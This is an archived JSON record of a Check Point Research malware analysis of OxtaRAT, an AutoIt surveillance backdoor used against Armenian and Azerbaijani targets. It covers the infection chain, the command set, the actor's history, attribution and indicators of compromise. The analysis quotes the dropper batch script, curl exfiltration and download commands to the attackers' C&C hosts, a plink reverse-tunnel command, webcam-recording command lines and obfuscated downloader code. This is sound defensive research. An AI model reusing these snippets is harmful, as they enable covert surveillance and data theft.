{
    "id": "99450690-083c-41b0-851c-4a6b7d6cedca",
    "created_at": "2023-03-03T02:07:19.449327Z",
    "updated_at": "2025-03-27T02:05:59.37975Z",
    "deleted_at": null,
    "sha1_hash": "85421dd4c09820beb86f28546dfb8b008afe9a83",
    "title": "2023-02-16 - Operation Silent Watch- Desktop Surveillance in Azerbaijan and Armenia",
    "authors": "",
    "file_creation_date": "2023-03-01T09:20:32Z",
    "file_modification_date": "2023-03-01T09:20:32Z",
    "file_size": 1161285,
    "plain_text": "# Operation Silent Watch: Desktop Surveillance in Azerbaijan and Armenia\n\n**[research.checkpoint.com/2023/operation-silent-watch-desktop-surveillance-in-azerbaijan-and-armenia/](https://research.checkpoint.com/2023/operation-silent-watch-desktop-surveillance-in-azerbaijan-and-armenia/)**\n\nFebruary 16, 2023\n\n## Executive summary\n\nAmid [rising tensions between Azerbaijan and Armenia over the Lachin corridor in late 2022,](https://edition.cnn.com/2023/01/12/europe/armenia-azerbaijan-nagorno-karabakh-lachin-intl/index.html)\nCheck Point Research identified a malicious campaign against entities in Armenia. The\nmalware distributed in this campaign is a new version of a backdoor we track as OxtaRAT, an\nAutoIt-based tool for remote access and desktop surveillance.\n\n**Key findings:**\n\nThe newest version of OxtaRAT is a polyglot file, which combines compiled AutoIT\nscript and an image. The tool capabilities include searching for and exfiltrating files\nfrom the infected machine, recording the video from the web camera and desktop,\nremotely controlling the compromised machine with TightVNC, installing a web shell,\nperforming port scanning, and more.\nCompared to previous campaigns of this threat actor, the latest campaign from\nNovember 2022 presents changes in the infection chain, improved operational security,\nand new functionality to improve the ways to steal the victim’s data.\nThe threat actors behind these attacks have been targeting human rights\norganizations, dissidents, and independent media in Azerbaijan for several years. This\nis the first time there is a clear indication of these attackers using OxtaRAT against\nArmenian targets and targeting corporate environments.\n\nIn this report, we provide a full technical analysis of the OxtaRAT as well as its capabilities\nand evolution over the years. We also discuss the tactics, techniques and procedures (TTPs)\nof the threat actors, complete with an overview of their activity throughout the years.\n\n## Background\n\nThe Republic of Artsakh, also known as the Nagorno-Karabakh Republic, is a breakaway\nregion in the South Caucasus with a majority ethnic Armenian population but is recognized\ninternationally as part of Azerbaijan. It is a de facto enclave within Azerbaijan, with the only\nland route to Armenia through the Lachin corridor, which has been under the control of\nRussian peacekeepers since the end of the Second Nagorno-Karabakh War in 2020.\n\n\n-----\n\nThe situation in Artsakh is tense, with frequent ceasefire violations and sporadic outbreaks of\nviolence. For more than two decades, this unresolved highly militarized ethno-nationalist\nterritorial conflict continues to be a source of tension between Armenia and Azerbaijan.\n\n[Figure 1 – Map of the conflict over Nagorno-Karabakh (Artsakh). Source: CNN.](https://edition.cnn.com/2023/01/12/europe/armenia-azerbaijan-nagorno-karabakh-lachin-intl/index.html)\n\n## The Infection Chain\n\n\n-----\n\nFigure 2 – The infection chain.\nA malicious file named Israeli_NGO_thanks_Artsakh_bank_for_the_support_of.scrwas\nsubmitted to VirusTotal (VT) on November 29, 2022, from an IP address located in Yerevan,\nArmenia.\n\nIt is a self-extracting archive that masquerades as a PDF file and bears a PDF icon. Upon\nexecution, it drops to the Temp folder of the infected device and executes a self-extracting\ncab called Alexander_Lapshin.EXE. This in turn drops multiple additional files and executes\none of them – the exec.bat script. In its deobfuscated form, this script is very short:\n```\n@echo off\n\nxcopy /y /e /k /h /i * %appdata%\\Autoit3\\\n\ncopy /b /y %appdata%\\Autoit3\\Alexander_Lapshin.pdf %temp%\\\n\nstart %temp%\\Alexander_Lapshin.pdf\n\nstart %appdata%\\Autoit3\\Autoit3.exe %appdata%\\Autoit3\\icon.png\n\nexit\n\n```\n[The exec.bat file is responsible for opening a lure PDF file that contains a Wikipedia article](https://en.wikipedia.org/wiki/Alexander_Lapshin)\nabout Alexander Lapshin. At the same time, in the background, it copies multiple auxiliary\nfiles and the AutoIt interpreter to %appdata%\\Autoit3\\ and uses it to execute a malicious\nAutoIt code hidden inside an image called icon.png.\n\n\n-----\n\nFigure 3 – Lure PDF document.\nAlexander Lapshin, a Russian-Israeli travel blogger, journalist, and human rights activist, was\ndetained in Belarus in 2016 and extradited to Azerbaijan. He was sentenced to 3 years in\nprison for illegally crossing the internationally recognized borders of Azerbaijan, without\nauthorization from the Azerbaijani authorities, in 2011 and 2012 while visiting NagornoKarabakh from Armenia. Nine months into his detention, in September 2017, Lapshin was\nattacked in a solitary confinement cell of a Baku pre-trial detention center. The attack was\npublicly declared by Azerbaijani officials to be a suicide attempt. Afterward, he was pardoned\nby the Azerbaijani President and deported to Israel.\n\n\n-----\n\n[In 2021, the European Court of Human Rights in the CASE OF LAPSHIN v. AZERBAIJAN](https://hudoc.echr.coe.int/fre#%7B%22tabview%22:%5B%22notice%22%5D,%22itemid%22:%5B%22001-210045%22%5D%7D)\nruled that Lapshin’s right to life had been violated by Azerbaijan authorities and mandated\n[that Azerbaijan pay 30,000 Euros as compensation. After the verdict, Lapshin publicly posted](https://www.facebook.com/lapshin/posts/pfbid047bhbtFcrAR7qokkuvgtiTfDgPGaXx54a2qzakeNzeFZusfrJX5md94p6mqpiFiol)\na picture of the credit card he opened to receive his compensation, issued by the Armenian\nArtsakhbank. Likely, this incident made Lapshin’s name an attractive lure for the attackers\ntargeting the bank.\n\n## The OxtaRAT Backdoor\n\nAs we mentioned previously, AutoIT.exe is used to run code from an image called icon.png.\nThis is a polyglot malware, combining valid JPEG and AutoIT A3X file formats:\n\nFigure 4 – Icon.png image and its internal structure.\nAutoIT is a legitimate tool that is used by many IT administrators to automate tasks but is\nfrequently abused by threat actors. In this case, the actors use a fully functional backdoor\ncontaining approximately 20,000 lines of obfuscated AutoIt code:\n\nFigure 5 – Fragment of OxtaRAT code including string obfuscations and random names.\nThe backdoor, which we call OxtaRAT, contains a variety of capabilities typically associated\nwith espionage activity. It contains commands that allow the attackers to:\n\nRun additional code on the infected machine, install a PHP web shell, download,\nupload and execute files.\nSearch and exfiltrate files from specific locations or with specific patterns, and even\ninstall the [PHP FileManager for easier access to and management of the files.](https://github.com/dulldusk/phpfm)\nPerform active surveillance activity: record video from a web camera or desktop, and\ninstall additional software, such as TightVNC, to remotely control and monitor the\nmachine.\n\n\n-----\n\nPerform recon on the local machine, such as getting information about the processes,\ndrives, system information, and the speed of the internet connection using Speedtest.\nUse a compromised host as a pivot to move through the network: perform port\nscanning and use Putty’s plink for tunneled communication.\n\n## Execution flow\n\nThe backdoor starts by first setting up its base folder, moving the icon.png file there, and\nadding a persistence mechanism to run it every 2 minutes with AutoIt3.exe via a scheduled\ntask named WallPaperChangeApp. It also creates a working folder to store the results and\nlogs of each command execution and sets hidden and system attributes for both base and\nworking folders to conceal them from being easily discovered and arouse suspicion. It also\ndownloads the legitimate curl executable and DLL, which are later used for some types of\nC&C communication.\n\nThe C&C server for this sample is edupoliceam[.]info, a lookalike for the domain of the\nPolice Education Complex of Police of the Republic of Armenia.\n\nNext, the malware enters the main infinite loop, where in each step it performs the following\nactions:\n\nCreates a screenshot of the infected computer.\nSends a GET request to the C&C server to report the victim’s basic information:\n```\n   https://edupoliceam[.]info/upload.php?GUID=\n   <guid>&SYS=PC_Name|User_Name|IP_address.\n\n```\nUploads (using curl) to the C&C server all the files from the working folder which\ncontain screenshots and the results and logs of the previous command execution.\nSends a GET request to C&C server to retrieve the command from the URL:\n```\n   https://edupoliceam[.]info/upload.php?GUID=<guid>&come=1.\n\n```\nMost of the capabilities require additional files, mostly legitimate, to be downloaded during\nthe malware execution from the path on the server /requirement/up/bin/:\n\n\n-----\n\n/requirement/up/bin/postup.exe (curl.exe)\n\n/requirement/up/bin/libcurl.dll\n\n/requirement/up/bin/vlc.zip\n\n/requirement/up/bin/7zxa.dll\n\n/requirement/up/bin/7za.exe\n/requirement/up/bin/7za.dll\n\n/requirement/up/bin/pscclient.exe (port scanner)\n\n/requirement/up/bin/ptun.exe (Plink)\n\n/requirement/up/bin/wintight.exe (TightVNC)\n\n/requirement/up/bin/wsrrun.exe (PHP CLI and PHP File Manager,\n[https://sourceforge.net/projects/phpfm/)](https://sourceforge.net/projects/phpfm/)\n\n/requirement/up/bin/WinRAR32.zip\n\n/requirement/up/bin/WinRAR64.zip\n\n[/requirement/up/bin/speedtest.zip (based on https://github.com/sivel/speedtest-cli)](https://github.com/sivel/speedtest-cli)\n\n/requirement/up/bin/AppCrashCollector.exe (the “implant”)\n\nThe only next-stage tool that wasn’t available on the server, was AppCrashCollector.exe,\nwhose download and execution are triggered by the implant command. We assume that this\nis the payload that the actors attempt to hide from researchers and deliver to important\ntargets only after additional checks are performed on the infected machine.\n\n## C&C communication and commands\n\nThe communication between the malware and its C&C server is based on clear text\ncommands, the arguments for each command are separated by the “|” sign.\n\nThe full list of commands supported by the backdoor:\n\ncommand parameters description\n\ndownload file name Upload a file using curl (postup.exe): postup.exe\n```\n                    -s -o nul -k --max-time 777 -A \"Mozilla/5.0\n                    (Windows NT 11.0; rv:54.0) Gecko/20100101\n                    Firefox/96.1\" -F \"\n                    [email protected]\"filename\"\n                    https://edupoliceam[.]info/upload.php?GUID=\n                    <guid>.\n\n```\nupload file name Download a file and save it with a specified\nfilename and random prefix in the Temp directory.\n\nuploadexec file name Download and execute with wmic\n```\n                    /node:%computername%\" process call create\n                    $output_filename.\n\n```\n\naueval expression to\nbe evaluated\n\n\nExecute a specified expression with AutoIT\ncommand [Execute.](https://www.autoitscript.com/autoit3/docs/functions/Execute.htm)\n\n\n-----\n\ncommand parameters description\n\nmakepersistent Create a scheduled task\ncalled WallPaperChangeApp.\n\nImplant Download and execute AppCrashCollector.exe.\n\nstopimplant Kill the AppCrashCollector process with taskkill\n```\n                    /IM and set settings.ini to 0.\n\n```\nsearch path, pattern Search for a pattern in a specified path\nwith PowerShell -Noni -command '(get```\n                    childitem '\" & $path & \"' -Recurse -ea 0)|\n                    select Fullname | ? {$_.Fullname -like '\" &\n                    $pattern & \"'} | fl.\n\n```\nlistdesktop List the contents of the Desktop folder with dir /s\n```\n                    \"%homepath%\\Desktop.\n\n```\nlistdir directory path List a specified directory recursively, including the\nlast modified date and size.\n\nmassdownload path, filter Upload files from a specified path with a specified\nfilter (include/exclude), using curl for each file (the\nsame way as the download command),\nwith &MASSDL=1 parameter in the URL.\n\nmassdownload2list path, filter List all files in a specified path matching the\nspecified filter to the Thumb.db file.\n\n\nmassdownload2 path, filter,\n\n[range]\n\n\nUpload files from a specified path\nfrom Thumb.db with POST request to the URL\nwith &MASSDL2=1 parameter.\n\n\nwebcamrecord length Webcam recording using VLC: $tmp_blcvid &\n```\n                    \"\\blc\\vlc\\MediaRun.exe --no-qt-privacy-ask\n                    dshow:// --sout file/avi:\" & $tmp_blcvid &\n                    \"\\webcam-video-record-\" & $timestamp & \"                    sec-\" & $chunk_length & \".avi --run-time=\"\n                    & $chunk_length & \" -Idummy --quiet\n                    vlc://quit\". The records are uploaded zipped\n\n```\nusing curl and are then deleted.\n\ndesktoprecord length Desktop recording using VLC: $tmp_blcvid &\n```\n                    \"\\blc\\vlc\\MediaRun.exe --no-qt-privacy-ask\n                    screen:// --sout file/avi:\" & $tmp_blcvid &\n                    \"\\Desktop-video-record-\" & $timestamp & \"                    sec-\" & $chunk_length & \".avi --run-time=\"\n                    & $chunk_length & \" -Idummy --quiet\n                    vlc://quit\". The records are uploaded zipped\n\n```\nusing curl and then deleted.\n\n\n-----\n\ncommand parameters description\n\ntightvnc Download Wintight.exe (AutoIt compiled\nexecutable which extracts and runs tvnserver.exe)\nand execute it with wmic process call create.\n\nkilltightvnc Kill TightVNC with taskkill /IM TVN* /F.\n\n\nzipit source, zip file\nname,\ndestination,\n\n[filter]\n\nunzipit source,\ndestination\n\n\nZip the folder using 7za.exe.\n\nUnzip the archive using 7za.exe.\n\n\ninstallrar Download and unzip WinRAR.\n\n\nrarit source,\ndestination,\n\n[extensions],\n\n[volume_size]\n\nunrarit source,\ndestination\n\n\nArchive the file/files with specific extensions from\nthe folder using WinRAR.\n\nExtract the archive using Unrar.exe.\n\n\nreboot Reboot with cmd.exe /c shutdown -r -t 0 /f.\n\ncurl url Execute the curl command: postup.exe -i -vvv\n```\n                    -k --max-time 60 -A \"Mozilla/5.0 (Windows\n                    NT 11.0; rv:54.0) Gecko/20100101\n                    Firefox/96.0.1\" & $url.\n\n```\n\nportscan ip/ip_range,\nport/port_range\n\ntunnel server, user,\npassword, port,\nhost,\nhost_port,\nlocal_port\n\n\nDownload and execute the portscan script (AutoITbased pscclient.exe)\n\nDownload, unzip and execute reverse port\nforwarding with plink: ptun.exe & $server & \" -P\n```\n\" & $port & \" -C -R 127.0.0.1:\" &\n$listen_port & \":\" & $host & \":\" &\n$host_port & \" -l \" & $user & \" -pw \" &\n$password.\n\n```\n\nkilltunnel Kill the tunnel with taskkill /IM powers* /F &\n```\n                    taskkill /IM ptun.exe.\n\n```\nwwwserv Download, unzip and run PHP web server on port\n[3136 with PHP File Manager. This is done by](https://sourceforge.net/projects/phpfm/)\ndownloading the AutoIT-based wsrrun.exe which\nextracts all needed files and executes php CLI\nas connectionlessupdate.exe -q -S\n```\n                    127.0.0.1:3136 -t <root folder> -H.\n\n```\n\n-----\n\ncommand parameters description\n\nstopwwwserv Kill the web server with taskkill /IM\n```\n                    connectionle* /F.\n\n```\nwmicexec process Execute with 'wmic /node:' & %computername% &\n```\n                    'process call create' & $process.\n\n```\nsysinfo Collect system info with hostname & ipconfig\n```\n                    /all & arp -a & getmac & net use & net\n                    share & quser /server:localhost & whoami\n                    /all & net user & systeminfo & wmic process\n                    get commandline & nslookup\n                    myip.opendns.com. resolver1.opendns.com.\n\n```\ngetip Get network drives with PowerShell -ep bypass command get-psdrive.\n\nshowdrives Get network drives with powershell -ep bypass ```\n                    command get-psdrive.\n\n```\nproclist Get the process list by wmic process get\n```\n                    commandline.\n\n```\nspeedtest Download, unzip and execute Speedtest.\n\nshowagentversion Return the agent version (version 11 is hardcoded\nin this specific sample).\n\ntempclean Clean the Temp folder with rmdir /q /s %temp%,\n```\n                    mkdir %temp%.\n\n```\nradar time Exit if the time since the last call is smaller than the\nparameter.\n\nexitself Exit.\n\nFor the commands that require output, the final command line that was executed and its\noutput are written to the working directory to the file with Random(1, 815782) & \"```\ncommand-.txt\" name.\n\n## Previous campaigns\n\n```\nAlthough not widely discussed, previous versions of the OxtaRAT backdoor were used in\nearlier attacks against Azerbaijani political and human rights activists – or, when the targets\nwere not disclosed publicly, their lures referenced Azerbaijan-Armenia tensions around\nArtsakh. The older versions of OxtaRAT have significantly less functionality than the new\nvariant but contain similar code and names for most of the commands and the same C&C\ncommunication pattern.\n\n\n-----\n\n### June 2021\n\n[In July 2021, Qurium Media reported that several prominent human rights and political](https://www.qurium.org/alerts/phishing-attack-against-azerbaijani-political-and-human-right-activities/)\nactivists in Azerbaijan received targeted phishing emails that lured them to download\nmalware from the Google Drive link. The link led to a password-protected RAR archive (the\npassword was specified in the email) which in turn contained an Auto-IT compiled executable\ncalled “Human Rights Invoice Form Document -2021.exe\". When executed, it\ndownloaded from the C&C server shoesbuysellone[.]live the main AutoIT malware (md5:\n0360185bc6371ae42ca0dffe0a21455d). Although it doesn’t contain a hardcoded “agent\nversion” number, we can clearly see that this is an earlier version of OxtaRAT. It has very\nsimilar functionality and code, but supports fewer commands (11 in total):\n\ndownload\n\nimplant makepersistent\n\nstopimplant aueval\n\nmassdownload upload\n\nwebcamrecord uploadexec\n\ndesktoprecord wmicexec\n\n### August 2021\n\nIn August 2021, another sample was observed, this time submitted to VirusTotal from\nArmenia. The file called REPORT_ON_THE_AZERBAIJANI_MILLITARY_AGRESSION (Final\n```\nUpdated 2021).scr also bears the PDF icon, and when executed, presents the victim with\n\n```\nthe following PDF lure:\n\nFigure 6 – PDF lure for the August 2021 version (md5:\nddac9a1189e4b9528d411e07d0e98895).\n\n\n-----\n\nIn the background, it downloads the main malware from the C&C server\n```\nhttps://www.filecloudservices.xyz/wp-comment.php and saves it as\nPhoneAppService.Exe. The code of this version implements the same string obfuscation as\n\n```\nthe newest version:\n```\n$koda_gui =\nStringFromASCIIArray(StringSplit(\"77|111|122|105|108|108|97|47|53|46|48|32|40|76|105|1\n \"|\"), 1) // Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K)\nAppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 18.3\n\nFileInstall(\".\\REPORT_ON_THE_AZERBAIJANI_MILLITARY_AGRESSION_AGAINST_ARTSAKH.pdf\",\n@AppDataDir & \"\\\" &\n\"REPORT_ON_THE_AZERBAIJANI_MILLITARY_AGRESSION_AGAINST_ARTSAKH.pdf\", 1)\n\n$n =\nStringFromASCIIArray(StringSplit(\"104|116|116|112|115|58|47|47|119|119|119|46|102|105|\n \"|\"), 1) //https://www.filecloudservices.xyz/wp-comment.php\n\n$m =\nStringFromASCIIArray(StringSplit(\"80|104|111|110|101|65|112|112|83|101|114|118|105|99|\n \"|\"), 1) //PhoneAppService.Exe\n\nRun(@ComSpec & \" File.txt /\" & \"c \" &\nStringFromASCIIArray(StringSplit(\"115|116|97|114|116\", \"|\"), 1) & \" \" & @AppDataDir &\n\"\\\" & \"REPORT_ON_THE_AZERBAIJANI_MILLITARY_AGRESSION_AGAINST_ARTSAKH.pdf\",\n@AppDataDir, @SW_HIDE)\n\nHttpSetUserAgent($koda_gui)\n\nHttpSetProxy(1)\n\nInetGet($n, @TempDir & \"\\\" & $m, 1)\n\n### February 2022\n\n```\nIn February of last year, Qurium [reported another attack, this time](https://www.qurium.org/alerts/azerbaijan/yet-another-targeted-malware-against-azerbajani-political-activists/) [targeting Abulfaz Gurbanli,](https://www.az-netwatch.org/news/deliberate-targeting-in-pro-government-media-leads-to-targeted-attacks-online-the-case-of-abulfaz-gurbanli/)\nan Azerbaijani political activist. The attackers pretended to be BBC journalists and, similar to\nthe June 2021 attacks, sent the victim an email which contained a Google Drive link, pointing\nto a password-protected RAR archive called BBC-suallar.rar (“BBC questions”). Once\nagain, a AutoIT-compiled executable called suallar.scr was extracted. This time, it\nmasqueraded as a Word document, complete with a Word icon. Upon execution, it presented\nthe lure DOC file called smm-fraza.doc.\n\nIn the background, it downloaded from the C&C server\n```\nhttps://smartappsfoursix[.]xyz/wp-feed.php and run another version of OxtaRAT. This\n\n```\nis a more advanced version, compared to the 2021 attacks, with many additional commands\nadded (29 in total):\n\n\n-----\n\ndownload\n\naueval\n\nupload\n\nuploadexec\n\nexittemp\n\nimplant\n\nstopimplant\n\nradar\nmassdownload\n\nwebcamrecord\n\ndesktoprecord\n\nmakepersistent\n\nuntrace\n\nwwwserv\n\nstopwwwserv\n\n\ncurl\n\nreboot\n\nzipit\n\nunzipit\n\ntunnel\n\ntightvnc\n\nwmicexec\n\nsearch\n\nsysinfo\n\nshowdrives\n\ngetip\n\nlistdesktop\n\nkilltightvnc\n\nkilltunnel\n\n\nThe version from June 2021 was capable only of downloading and exfiltrating files, executing\nthe binaries and AutoIT code, and recording data from the desktop and web camera. In\ncontrast, the version observed in February 2022 is a more powerful malware with a lot of\nadditional features. The actors added capabilities to improve local file enumeration (list files\non the desktop, search for specific files), collect data about the compromised system, work\nwith zip files, and, most importantly, improved the ways they can access and control the\ninfected machine by adding commands to install TightVNC or the PHP web server.\n\n## How does the attack from November 2022 differ from the earlier attacks?\n\n### Infection chain\n\nThe first change that the actors implemented in their latest attack is in the infection chain.\nPreviously, the initial .SCR files, masquerading as Word or PDF documents, served only as\ndownloaders. They sent a request to WordPress-like URLs on the C&C server (wp-feed.php,\n```\nwp-comment.php, etc) and then executed the main malware received from the attackers’\n\n```\nserver. In the latest campaign, the .SCR file already contains the OxtaRAT backdoor, as a\npolyglot file. This saves the actors from needing to make additional requests for binaries to\nthe C&C server and attracting unnecessary attention, as well as hides the main malware\nfrom being easily discovered on the infected machine, as it looks like a regular image and\nbypasses type-specific protections.\n\n### Geofencing\n\n\n-----\n\nThe actors added an additional measure to protect their infrastructure, geofencing the C&C\ndomains that store the auxiliary tools and additional payloads. This is a technique currently\nused by many experienced threat actors to make sure that the proper execution flow is not\ntriggered by sandboxes or researchers, but only on the targeted machines. In this case, the\nactors limited their operations to Armenian IP addresses.\n\n### Data collection and exfiltration\n\nSince the previous publicly disclosed version, OxtaRAT was updated with 10 additional\ncommands introducing new functionality. Most of the new features aim to improve the ways\nto steal the victim’s data. For example, they implemented the listdir command to\nrecursively enumerate the files in a specified folder, collecting additional data such as the last\nmodified date and size. The previously existing command massdownload, which is used to\nexfiltrate files of predefined types, was also updated with a few new file extensions (marked\nin bold):\n```\n\"*.mdb;*.accdb;*.rdo;*.ora;*.accda;*.accdr;*.accdt;*.ppt;*.avi;*.pptx;*.odt;*.\npdf;*.txt;*.msf;*.docx;*.xml;*.doc;*.rtf;*.jpg;*.jpeg;*.png;*.xls;*.xlsx;*.rdp\n;*.zip;*.rar;*.sql;*.sqlite;*.php;*.avi;*.mp4;*.tar;*.tar.gz;*.7z;*.bz2;*.tar.\nbz2\"\n\n```\nAs can be seen from this snippet, the actors are now interested in additional file types related\nto Oracle and Microsoft Access databases. This is an interesting development, as it indicates\nthey may be broadening their targets to include corporate networks or specific individuals, as\ncommon private computers rarely contain personal files in DB formats.\n\nThe actors also implemented “advanced” mass-download commands such as the\n```\nmassdownload2 and massdownload2list that allow the actors to enumerate and exfiltrate\n\n```\nspecified filetypes more conveniently. In addition, they implemented functions to work with\nRAR archives (installrar, rarit, unrarit) which, along with the clear benefits of\nuploading the auxiliary tools inside RAR archives to the infected machines, enable the actors\nto archive all the files of their interest to the multi-volume RAR archive. The default list of\nextensions provided in the code of the rarit exfiltration function shows a focus on\ndocuments, pictures, archives, and databases:\n```\nFunc rar_it($source_file_or_dir, $destination_path, $extensions_to_rar =\n\"*.xls;*.xlsx;*.doc;*.docx;*.pdf;*.rar;*.zip;*.tar;*.tar.gz;*.sql;*.txt;*.mdb;*.jpg;*.\n $parts = \"12M\")\n\n```\nAnother interesting feature included in the most recent version is the speedtest command\nwhich invokes Speedtest CLI, a dedicated tool to test the speed and performance of an\ninternet connection. As the malware is not only capable of collecting a large quantity of files\nbut also recording video from a web camera and screen, it can produce significantly large\n\n\n-----\n\noutputs with gigabytes of data. Therefore, for the sake of OPSEC, to hide the extensive data\nexfiltration the actors likely needed a way to control and estimate the upload all of the\ncollected information to their servers.\n\nThe last feature added to the data collection mechanism is a proclist command, which\nuses WMIC to retrieve the command line for each of the processes. This feature might be\nused for evasion purposes, so the actors can make sure they are running in an actual\nenvironment as opposed to a sandbox, as well as to learn more about the software\nconfigurations running on the victim’s machine.\n\n### Port Scanning\n\nOne of the unexpected features that we found during this investigation is the portscan tool,\nwhich is included only in the newer version of the backdoor. The port scanner,\n```\npscclient.exe, is an Auto-IT based non-obfuscated TCP Connect tool that can scan a\n\n```\nspecified range of IP addresses and a range of ports. The default range of ports configured\nin the tool includes both well-known and non-standard ports:\n```\nGlobal $port_range[100] = [135, 4444, 136, 137, 138, 139, 20, 21, 22, 23, 80, 443,\n445, 8443, 8080, 3131, 3128, 5681, 5060, 5061, 3389, 33899, 33399, 3390, 389, 4000,\n1433, 1521, 9222, 45687, 7292, 789, 50022, 2109, 2233, 55522, 33391, 33392, 33390,\n33394, 33389, 33398]\n\n```\nOxtaRAT, which previously had mostly local recon and surveillance capabilities, can now be\nused as a pivot for active reconnaissance of other devices. This may indicate that the threat\nactors are preparing to extend their main attack vector, which is currently social engineering,\nto infrastructure-based attacks. It also might be a sign that the actors are moving from\ntargeting individuals to targeting more complex or corporate environments.\n\n## Infrastructure\n\nOur search for domains with similar characteristics to edupoliceam[.]info led to more\nactive domains: filesindrive[.]info, mediacloud[.]space and avvpassport[.]info. All\nthe domains are registered with NameCheap. While filesindrive[.]info and\n```\nmediacloud[.]space, similar to filecloudservices[.]xyz used in back in 2021, have a\n\n```\ngeneric reference to cloud file storages, the domain avvpassport[.]info is more specific,\nand it masquerades as the Passport and Visa Office of the Republic of Armenia. Both of\nthese domains, edupoliceam[.]info and avvpassport[.]info, were created on September\n23, 2022, and were likely also used for other attacks on Armenian targets.\n\nAt the beginning of our investigation, all of these domains used Cloudflare services to hide\ntheir IP addresses. Due to their configuration, by looking for IP addresses with the same\nbehavior, we identified 38.242.197[.]156 as likely their real IP address. While we were\n\n\n-----\n\ncompleting the investigation and notifying the relevant parties, Cloudflare blocked these\ndomains as malicious, and they all started to publicly resolve to their real IP address\n```\n38.242.197[.]156.\n\n## Targeting and Attribution\n\n```\n[Alexander Lapshin, whose name is used in the lure, shared that on the same day the](https://www.facebook.com/permalink.php?story_fbid=pfbid02EBSo3mX2da88WfDK1kcTCL9HoD7hjhLfMjG8Fd132QBf37UPagzsPf5iivCit7fwl&id=100036865157039)\nsamples were uploaded to VT, the representatives of Artsakh bank notified that they received\n[malicious emails in his name. This information was also later confirmed by Cyberhub-AM,](https://cyberhub.am/en/)\ndigital security helpdesk for Armenian civil society. Due to the infrastructure revealed, we\nbelieve that there might have been other targets of this campaign in Armenia as well.\n\nFigure 7 – Facebook post by Lapshin (automatic translation).\nAll of the samples from this campaign and earlier ones are related to Azerbaijani government\ninterests; they either targeted Azerbaijani political and human rights activists or, if the targets\nwere not disclosed publicly, reference tensions between Azerbaijan and Armenia over\n[Artsakh/Nagorno-Karabakh. Meta, in their Adversarial Threat Report Q1-2021, attributed the](https://about.fb.com/wp-content/uploads/2022/04/Meta-Quarterly-Adversarial-Threat-Report_Q1-2022.pdf)\nprevious campaigns reported by Qurium to the Azeri Ministry of Internal Affairs. However, no\ntechnical analyses were provided.\n\n[In 2017, Amnesty International reported a campaign that started as early as November 2015](https://web.archive.org/web/20190416193823/https:/www.amnesty.org/en/latest/research/2017/03/False-Friends-Spearphishing-of-Dissidents-in-Azerbaijan/)\nand continued through 2017. This campaign used Autoit malware called AutoItSpy against\n[Azerbaijani dissidents, and was later connected by Qurium to other “denial-of-service](https://www.qurium.org/alerts/news-media-websites-attacked-from-governmental-infrastructure-in-azerbaijan/)\nattacks, intrusion attempts, spear-phishing campaigns and electronic media monitoring from\nInternet infrastructure associated with the Government of Azerbaijan.” The AutoItSpy\nmalware used at the time had the ability to log the keystrokes and collect screenshots,\nexfiltrating both of them over SMTP protocol.\n\nEven though we couldn’t find any infrastructure overlap with our campaign (considering a\ngap of a few years and public exposure of previous attacks), there is a significant overlap in\nmajor TTPs:\n\n\n-----\n\nThe use of AutoIT malware.\nThe use of files with SCR extensions bearing document-related icons (PDF, Word).\nA focus on surveillance technology (keylogging, screen capture, data exfiltration).\nSimilar consistent targeting.\n\nAlthough it is tricky to compare the code of tools with different functionality (keylogger\ncompared to a full-blown surveillance tool), there are a few high-level overlaps in the coding\nstyle of these tools:\n\nThe samples from the AutoItSpy campaign are obfuscated with similar techniques as\nthe OxtaRAT samples from 2022.\nTemporary file names with collected information of AutoItSpy and OxtraRAT both mimic\nthe Windows thumbnail cache:\n\nFigure 8 – “Thumb” in file names of AutoItSpy (top) and OxtraRAT (bottom).\n\nAdditional details such as extensively using %random% %random% %random% in all the\nbatch scripts, immediately setting file attributes with FileSetAttrib($dir, \"+SH\") for\nall the newly created folders, excessive usage of the Random function, etc.\n\nBased on these similarities in TTPs, code and targeting, we can conclude with medium\nconfidence that both cases involve the same threat actors. We can also speculate that the\nmissing “implant” in OxtaRAT that we were unable to access might be a keylogger; not only\nis it an important functionality missing from OxtaRAT’s multi-functional surveillance arsenal,\nbut also the actors might take extra measures to avoid revealing it to anyone except the\ntargets, possibly to avoid attribution based on already uncovered information.\n\n## Conclusion\n\nIn this article, we describe the latest attack and the evolution of the tools in the campaigns\nagainst Armenian targets, as well as Azerbaijani activists and dissidents. All the details\nindicate that the underlying threat actors have been maintaining the development of Auto-IT\n\n\n-----\n\nbased malware for the last seven years, and are using it in surveillance campaigns whose\ntargets are consistent with Azerbaijani interests.\n\nCheck Point’s [Threat Prevention Engines provides comprehensive coverage of attack](https://www.checkpoint.com/infinity/zero-day-protection/)\ntactics, file-types, and operating systems and protects against attacks such as described in\n[this research. ThreatCloud is Check Point’s rich cyber defense database. Its threat](https://www.checkpoint.com/infinity/threatcloud/)\nintelligence powers Check Point’s zero-day protection solutions.\n\nCheck Point products provide the following coverage against this threat:\n\nAnti-Bot: Trojan.WIN32.OxtaRAT.A, Trojan.WIN32.OxtaRAT.B\nThreat Emulation: Trojan.WIN.OxtaRAT.A\n\n## IOCs\n```\n6ac414fad3d61ad5b23c2bcdd8ee797f\n\nddac9a1189e4b9528d411e07d0e98895\n\n0360185bc6371ae42ca0dffe0a21455d\n\nddac9a1189e4b9528d411e07d0e98895\n\n1c94f1c6241cb598da5da7150a0dc541\n\ndf9673032789847a367df9923bbd44d2\n\na1a39e458977aa512b7ff2ba1995b18d\n\ncf225029cade918d92b4b4e2b789b7a5\n\n86b5245112436e8a5eabf92fab01ffba\n\nedupoliceam[.]info\n\nfilesindrive[.]info\n\nmediacloud[.]space\n\navvpassport[.]info\n\nfilecloudservices[.]xyz\n\n38.242.197[.]156\n\n\n```\nGO UP\n[BACK TO ALL POSTS](https://research.checkpoint.com/latest-publications/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-02-16 - Operation Silent Watch- Desktop Surveillance in Azerbaijan and Armenia.pdf"
    ],
    "report_names": [
        "2023-02-16 - Operation Silent Watch- Desktop Surveillance in Azerbaijan and Armenia.pdf"
    ],
    "threat_actors": [],
